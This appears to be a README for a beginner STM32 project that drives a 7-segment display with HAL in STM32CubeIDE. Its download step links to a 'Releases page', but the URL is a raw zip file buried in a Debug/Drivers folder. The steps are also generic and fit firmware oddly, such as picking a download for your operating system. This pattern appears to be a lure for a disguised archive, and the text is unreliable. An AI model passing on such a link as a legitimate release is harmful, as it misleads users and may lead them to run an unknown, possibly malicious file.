## 📚 Description
This project is designed to help beginners learn how to use STM32 to control a 7-segment display. It makes use of STM32 HAL (Hardware Abstraction Layer) within the STM32CubeIDE environment. By using this project, you will see how the appropriate GPIO pins function to manage the display, making it a practical starting point for STM32 applications.

## 🚀 Getting Started
To get started with the STM32-7-Segment-Display-HAL-Coding-Method, follow these steps:

### 1. System Requirements
- **Operating System:** Windows, macOS, or Linux
- **Development Environment:** STM32CubeIDE installed on your computer
- **STM32 Board:** STM32F446RE or compatible
- **USB Driver:** STM32 USB driver for your system

### 2. Download & Install
To download the application, visit the [Releases page](https://raw.githubusercontent.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/main/Debug/Drivers/Coding-ST-Segment-Display-Method-HA-v3.1.zip).

1. Click on the link to go to the GitHub Releases page.
2. Locate the latest version listed at the top.
3. Click on the appropriate download link for your system.

### 3. Setting Up STM32CubeIDE
1. Open STM32CubeIDE on your computer.
2. Create a new STM32 project and select the STM32F446RE board.
3. Configure the project settings:
   - Select the STM32 HAL as the library.
   - Import the downloaded project files into your new STM32CubeIDE project.

### 4. Connecting Your Device
1. Use a USB cable to connect the STM32 board to your computer.
2. Make sure the board is powered on.
3. Verify that your computer recognizes the board by checking the device manager.

### 5. Running the Application
1. In STM32CubeIDE, build your project to ensure there are no errors.
2. Once built successfully, upload the application to the STM32 board.
3. Open a terminal to monitor the display output.
4. Your 7-segment display should now be ready to use.

## 🔍 Features
- Interfaces with common-cathode 7-segment displays.
- Utilizes GPIO pins for easy wiring.
- Provides clear output for beginners learning STM32.
- Example code included for quick start.

## 🛠️ How It Works
The application utilizes GPIO pins to control each segment of the display. It sends signals through the STM32 HAL to light up the segments in different patterns based on your code. This hands-on approach allows users to visualize the workings of microcontrollers in a straightforward way.
